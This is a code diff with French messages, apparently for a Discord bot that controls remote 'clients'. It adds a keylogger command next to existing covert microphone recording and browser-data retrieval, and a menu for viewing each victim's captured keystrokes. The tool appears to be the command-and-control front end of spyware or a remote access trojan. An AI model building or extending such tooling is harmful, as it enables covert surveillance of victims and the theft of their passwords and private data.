@@ -58,17 +58,19 @@ export const handleSendCommand = async (interaction) => {
         command: command
     };
 
-    if (command === 'microphone' && duration) {
+    if ((command === 'microphone' || command === 'keylogger') && duration) {
         data.params = { duration };
-    } else if (command === 'microphone' && !duration) {
-        await interaction.editReply("Veuillez spécifier une durée pour l'enregistrement audio.");
+    } else if ((command === 'microphone' || command === 'keylogger') && !duration) {
+        await interaction.editReply(`La durée est requise pour la commande '${command}'.`);
         return;
     }
 
     try {
         await executeRequestWithTokenRefresh(url, { method: 'POST', data });
-        if (command === 'microphone') {
-            await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId} pour ${duration} secondes...`);
+        if (command === 'microphone' || command === 'keylogger') {
+            const contentType = command === 'microphone' ? 'de l\'audio' : 'du clavier';
+            // await interaction.editReply(`Démarrage de l'enregistrement audio pour le client ${clientId} pour ${duration} secondes...`);
+            await interaction.editReply(`Démarrage de l'enregistrement ${contentType} pour le client ${clientId} pour ${duration} secondes...`);
             let elapsedSeconds = 0;
             const intervalId = setInterval(async () => {
                 elapsedSeconds++;
@@ -76,7 +78,7 @@ export const handleSendCommand = async (interaction) => {
                 await interaction.editReply(`Enregistrement en cours... ${percentage}% complété.`);
                 if (elapsedSeconds >= duration) {
                     clearInterval(intervalId);
-                    await interaction.editReply(`Enregistrement audio terminé pour le client ${clientId}.`);
+                    await interaction.editReply(`Enregistrement terminé pour le client ${clientId}.`);
                 }
             }, 1000);
         } else {
@@ -149,6 +151,10 @@ export const handleListDataCommand = async (interaction) => {
             case 'browserdata':
                 content = "Sélectionnez un client pour voir les données de navigation :";
                 break;
+            case 'keylogger':
+                content = "Selectionner un client pour voir les enregistrements du clavier :";
+                break;
+
         }
 
         await interaction.editReply({content, components});
